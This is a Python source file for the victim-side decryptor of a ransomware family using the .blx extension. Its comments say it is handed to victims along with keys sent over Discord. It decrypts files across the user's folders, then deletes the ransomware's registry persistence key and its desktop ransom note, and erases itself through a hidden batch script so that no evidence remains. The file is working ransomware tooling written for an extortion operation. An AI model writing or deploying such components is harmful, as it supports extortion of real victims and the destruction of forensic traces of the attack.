# Copyright (c) BLX - Decryptor for .blx encrypted files
# Give this EXE (or script) to the victim with the decryption key.
# Key format: base64 string (32 bytes decoded) - same as sent via !key in Discord.
# Build to EXE: run build_decryptor_exe.bat or: pyinstaller --onefile --windowed --name BLX_Decryptor BLX_Decryptor.py

import os
import sys
import base64
import threading
import subprocess
import tempfile

try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox, scrolledtext
except ImportError:
    print("tkinter required. Run with Python and GUI support.")
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("Install: pip install cryptography")
    sys.exit(1)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_FOLDER = os.path.expanduser("~") if os.path.expanduser("~") else os.path.join("C:", "Users", os.getenv("USERNAME", ""))
BLX_EXT = ".blx"
CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)

# Fichier pour mémoriser la clé (dans AppData ou à côté du script)
def _get_saved_key_path():
    try:
        appdata = os.getenv("APPDATA", "")
        if appdata and os.path.isdir(appdata):
            d = os.path.join(appdata, "BLX_Decryptor")
            try:
                os.makedirs(d, exist_ok=True)
                return os.path.join(d, "saved_key.txt")
            except Exception:
                pass
    except Exception:
        pass
    return os.path.join(SCRIPT_DIR, "BLX_saved_key.txt")


def _get_desktop_paths():
    """Return list of possible desktop folder paths (user, OneDrive, Bureau, Public)."""
    u = os.getenv("USERPROFILE", "")
    p = os.getenv("PUBLIC", "")
    candidates = [
        os.path.join(u, "Desktop"),
        os.path.join(u, "OneDrive", "Desktop"),
        os.path.join(u, "OneDrive", "Bureau"),
        os.path.join(u, "Bureau"),
        os.path.join(p, "Desktop"),
    ]
    return [x for x in candidates if x and os.path.isdir(x)]


def remove_all_traces_and_self_delete():
    """Remove ransomware traces (persistence, README) and schedule self-deletion of the decryptor."""
    try:
        if sys.platform.startswith("win"):
            try:
                subprocess.run(
                    ["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "BLX_Update", "/f"],
                    creationflags=CREATE_NO_WINDOW,
                    timeout=5,
                    capture_output=True,
                )
            except Exception:
                pass
            for desktop in _get_desktop_paths():
                try:
                    readme = os.path.join(desktop, "README_BLX.txt")
                    if os.path.isfile(readme):
                        os.remove(readme)
                except Exception:
                    pass
        me = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        if not me or not os.path.isfile(me):
            return
        tmp = tempfile.gettempdir()
        bat = os.path.join(tmp, "BLX_cleanup_%s.bat" % os.getpid())
        me_quoted = '"%s"' % me.replace('"', '""')
        content = "@echo off\r\ntimeout /t 3 /nobreak >nul\r\ndel /f /q %s\r\ndel /f /q \"%%~f0\"\r\n" % me_quoted
        try:
            with open(bat, "w") as f:
                f.write(content)
            subprocess.Popen(
                ["cmd", "/c", bat],
                creationflags=CREATE_NO_WINDOW,
                cwd=tmp,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass
    except Exception:
        pass


def count_blx_files(folder):
    """Return total number of .blx files in folder (recursive)."""
    folder = (folder or "").strip() or DEFAULT_FOLDER
    if not os.path.isdir(folder):
        return 0
    n = 0
    for root, _dirs, files in os.walk(folder, topdown=True):
        for name in files:
            if name.lower().endswith(BLX_EXT):
                n += 1
    return n


def decrypt_file(key_bytes, path_blx, log_callback=None):
    """Decrypt a single .blx file. key_bytes must be 32 bytes. Format: [16 bytes IV][AES-256-CBC encrypted PKCS7-padded data]."""
    if len(key_bytes) != 32:
        return False, "Key must be 32 bytes (decode base64)"
    if not path_blx or not os.path.isfile(path_blx):
        return False, "Not a file or not found"
    try:
        with open(path_blx, "rb") as f:
            raw = f.read()
        if len(raw) < 17:
            return False, "File too small (corrupted or not .blx)"
        iv = raw[:16]
        encrypted = raw[16:]
        cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        data = unpadder.update(decrypted) + unpadder.finalize()
        path_lower = path_blx.lower()
        if path_lower.endswith(BLX_EXT):
            out_path = path_blx[: -len(BLX_EXT)]
        else:
            out_path = path_blx + ".dec"
        out_dir = os.path.dirname(out_path)
        if out_dir and not os.path.isdir(out_dir):
            try:
                os.makedirs(out_dir, exist_ok=True)
            except Exception:
                return False, "Cannot create output directory"
        with open(out_path, "wb") as f:
            f.write(data)
        try:
            os.remove(path_blx)
        except Exception:
            pass
        return True, out_path
    except ValueError as e:
        return False, "Clé incorrecte ou fichier corrompu (padding invalide)"
    except Exception as e:
        return False, str(e)


def decrypt_folder(key_b64, folder, log_callback=None, progress_callback=None, stop_flag=None):
    """Find all .blx files in folder (recursive) and decrypt them.
    progress_callback(current, total, path) optional.
    stop_flag: callable returning True to stop (e.g. lambda: self._stop_requested).
    """
    key_b64 = (key_b64 or "").strip()
    key_b64 = "".join(key_b64.split())
    if not key_b64:
        return 0, 0, "Enter the decryption key (base64).", []
    try:
        try:
            key_bytes = base64.b64decode(key_b64, validate=True)
        except TypeError:
            key_bytes = base64.b64decode(key_b64)
    except Exception as e:
        return 0, 0, f"Invalid base64 key: {e}", []
    if len(key_bytes) != 32:
        return 0, 0, f"Key must decode to 32 bytes (got {len(key_bytes)}).", []
    folder = (folder or "").strip() or DEFAULT_FOLDER
    if not os.path.isdir(folder):
        return 0, 0, f"Folder not found: {folder}", []
    # Collect all .blx paths first for progress
    paths = []
    for root, dirs, files in os.walk(folder, topdown=True):
        for name in files:
            if not name.lower().endswith(BLX_EXT):
                continue
            path_blx = os.path.join(root, name)
            if os.path.isfile(path_blx):
                paths.append(path_blx)
    total = len(paths)
    ok, fail = 0, 0
    errors = []
    for i, path_blx in enumerate(paths):
        if stop_flag and stop_flag():
            summary = f"Stopped. Decrypted: {ok} | Failed: {fail}"
            if errors:
                summary += "\n" + "\n".join(errors[:10])
            return ok, fail, summary, errors
        if progress_callback:
            try:
                progress_callback(i + 1, total, path_blx)
            except Exception:
                pass
        try:
            success, msg = decrypt_file(key_bytes, path_blx, log_callback)
            if success:
                ok += 1
                if log_callback:
                    log_callback(f"OK: {path_blx}\n  -> {msg}")
            else:
                fail += 1
                if log_callback:
                    log_callback(f"FAIL: {path_blx} - {msg}")
                errors.append(f"{path_blx}: {msg}")
        except Exception as e:
            fail += 1
            errors.append(f"{path_blx}: {e}")
            if log_callback:
                log_callback(f"ERROR: {path_blx} - {e}")
    summary = f"Decrypted: {ok} | Failed: {fail}"
    if errors:
        summary += "\n" + "\n".join(errors[:10])
        if len(errors) > 10:
            summary += f"\n... and {len(errors) - 10} more errors"
    return ok, fail, summary, errors


def load_saved_key():
    """Load memorized key from file if present."""
    path = _get_saved_key_path()
    if not path or not os.path.isfile(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return (f.read() or "").strip()
    except Exception:
        return ""


def save_key_to_file(key_b64):
    """Save key for next run (user convenience)."""
    if not (key_b64 or "").strip():
        return
    path = _get_saved_key_path()
    if not path:
        return
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write((key_b64 or "").strip())
    except Exception:
        pass


def save_report_to_file(folder, ok, fail, summary, errors_list=None):
    """Save decryption report to a file on desktop or in folder."""
    report_lines = [
        "BLX Decryptor - Report",
        "======================",
        f"Folder: {folder or '(not set)'}",
        f"Decrypted: {ok}",
        f"Failed: {fail}",
        "",
        summary,
    ]
    if errors_list:
        report_lines.append("")
        report_lines.append("Errors:")
        report_lines.extend(str(e)[:200] for e in errors_list[:50])
    content = "\n".join(report_lines)
    for desktop in _get_desktop_paths():
        try:
            report_path = os.path.join(desktop, "BLX_Decryptor_Report.txt")
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(content)
            return report_path
        except Exception:
            pass
    if folder and os.path.isdir(folder):
        try:
            report_path = os.path.join(folder, "BLX_Decryptor_Report.txt")
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(content)
            return report_path
        except Exception:
            pass
    return None


class DecryptorApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BLX Decryptor - Restore .blx files")
        self.root.geometry("620x520")
        self.root.resizable(True, True)
        self.root.configure(bg="#262626")
        self.root.option_add("*Font", "Segoe UI 10")
        self.folder_var = tk.StringVar(value=DEFAULT_FOLDER)
        self.key_var = tk.StringVar(value=load_saved_key())
        self.running = False
        self._stop_requested = False
        self._build_ui()

    def _build_ui(self):
        main = ttk.Frame(self.root, padding=12)
        main.pack(fill=tk.BOTH, expand=True)
        ttk.Label(main, text="Decryption key (base64) — paste the key you received:").pack(anchor=tk.W)
        self.key_entry = tk.Entry(main, textvariable=self.key_var, width=70, show="", font=("Consolas", 10))
        self.key_entry.pack(fill=tk.X, pady=(0, 8))
        ttk.Label(main, text="Folder to decrypt (default: your user folder):").pack(anchor=tk.W, pady=(8, 0))
        row = ttk.Frame(main)
        row.pack(fill=tk.X, pady=4)
        self.folder_entry = tk.Entry(row, textvariable=self.folder_var, width=55, font=("Consolas", 9))
        self.folder_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
        ttk.Button(row, text="Browse...", command=self._browse).pack(side=tk.RIGHT)
        ttk.Button(row, text="Count .blx", command=self._count_blx).pack(side=tk.RIGHT, padx=(0, 4))
        btn_row = ttk.Frame(main)
        btn_row.pack(pady=12)
        self.decrypt_btn = ttk.Button(btn_row, text="Decrypt .blx files", command=self._start_decrypt)
        self.decrypt_btn.pack(side=tk.LEFT, padx=(0, 8))
        self.stop_btn = ttk.Button(btn_row, text="Stop", command=self._request_stop, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT)
        ttk.Label(main, text="Progress:").pack(anchor=tk.W, pady=(4, 0))
        self.progress_var = tk.DoubleVar(value=0.0)
        self.progress_bar = ttk.Progressbar(main, variable=self.progress_var, maximum=100, length=400)
        self.progress_bar.pack(fill=tk.X, pady=4)
        self.progress_label = ttk.Label(main, text="")
        self.progress_label.pack(anchor=tk.W)
        ttk.Label(main, text="Log:").pack(anchor=tk.W, pady=(8, 0))
        self.log_text = scrolledtext.ScrolledText(main, height=12, width=72, font=("Consolas", 9), state=tk.DISABLED)
        self.log_text.pack(fill=tk.BOTH, expand=True, pady=4)

    def _browse(self):
        initial = (self.folder_var.get() or "").strip() or DEFAULT_FOLDER
        if not os.path.isdir(initial):
            initial = DEFAULT_FOLDER
        d = filedialog.askdirectory(title="Select folder to decrypt", initialdir=initial)
        if d:
            self.folder_var.set(d)

    def _count_blx(self):
        folder = (self.folder_var.get() or "").strip() or DEFAULT_FOLDER
        if not os.path.isdir(folder):
            self._log(f"Folder not found: {folder}")
            return
        self._log("Counting .blx files...")
        def run():
            n = count_blx_files(folder)
            self.root.after(0, lambda: self._log(f"Found {n} .blx file(s) in {folder}"))
        threading.Thread(target=run, daemon=True).start()

    def _request_stop(self):
        self._stop_requested = True

    def _log(self, msg):
        def _do():
            self.log_text.configure(state=tk.NORMAL)
            self.log_text.insert(tk.END, msg + "\n")
            self.log_text.see(tk.END)
            self.log_text.configure(state=tk.DISABLED)
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def _start_decrypt(self):
        if self.running:
            return
        self.running = True
        self._stop_requested = False
        try:
            self.decrypt_btn.configure(state=tk.DISABLED)
            self.stop_btn.configure(state=tk.NORMAL)
        except Exception:
            pass
        self.progress_var.set(0)
        self.progress_label.configure(text="")
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state=tk.DISABLED)
        key = self.key_var.get()
        folder = (self.folder_var.get() or "").strip() or DEFAULT_FOLDER

        def progress_cb(current, total, path):
            def _up():
                if total > 0:
                    self.progress_var.set(100.0 * current / total)
                self.progress_label.configure(text=f"{current} / {total} — {os.path.basename(path)[:50]}")
            try:
                self.root.after(0, _up)
            except Exception:
                pass

        def run():
            try:
                ok, fail, summary, errors = decrypt_folder(
                    key, folder,
                    log_callback=self._log,
                    progress_callback=progress_cb,
                    stop_flag=lambda: self._stop_requested,
                )
                self.root.after(0, lambda: self._done(ok, fail, summary, folder, errors))
            except Exception as e:
                self.root.after(0, lambda: self._done(0, 0, str(e), folder, []))
            finally:
                self.root.after(0, self._decrypt_finished)

        threading.Thread(target=run, daemon=True).start()

    def _decrypt_finished(self):
        self.running = False
        try:
            self.decrypt_btn.configure(state=tk.NORMAL)
            self.stop_btn.configure(state=tk.DISABLED)
            self.progress_var.set(100.0)
            self.progress_label.configure(text="")
        except Exception:
            pass

    def _done(self, ok, fail, summary, folder=None, errors=None):
        self._log(summary)
        if ok >= 1 and (self.key_var.get() or "").strip():
            save_key_to_file(self.key_var.get().strip())
        report_path = None
        if folder:
            report_path = save_report_to_file(folder, ok, fail, summary, errors or [])
        if report_path:
            self._log(f"Report saved: {report_path}")
        msg = f"Done.\n{summary}"
        if report_path:
            msg += f"\n\nReport saved: {report_path}"
        if len(msg) > 2000:
            msg = msg[:1997] + "..."
        messagebox.showinfo("BLX Decryptor", msg)
        if ok >= 1:
            self._log("Removing traces and uninstalling decryptor...")
            remove_all_traces_and_self_delete()
            try:
                self.root.quit()
                self.root.destroy()
            except Exception:
                pass
            sys.exit(0)

    def run(self):
        self.root.mainloop()


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--cli":
        key_b64 = input("Paste decryption key (base64): ").strip()
        folder = input("Folder to decrypt [Enter = default]: ").strip() or DEFAULT_FOLDER
        ok, fail, summary, _ = decrypt_folder(key_b64, folder)
        print(summary)
        if ok >= 1:
            print("Removing traces and uninstalling...")
            remove_all_traces_and_self_delete()
        sys.exit(0 if ok >= 1 else 1)
    app = DecryptorApp()
    app.run()


if __name__ == "__main__":
    main()
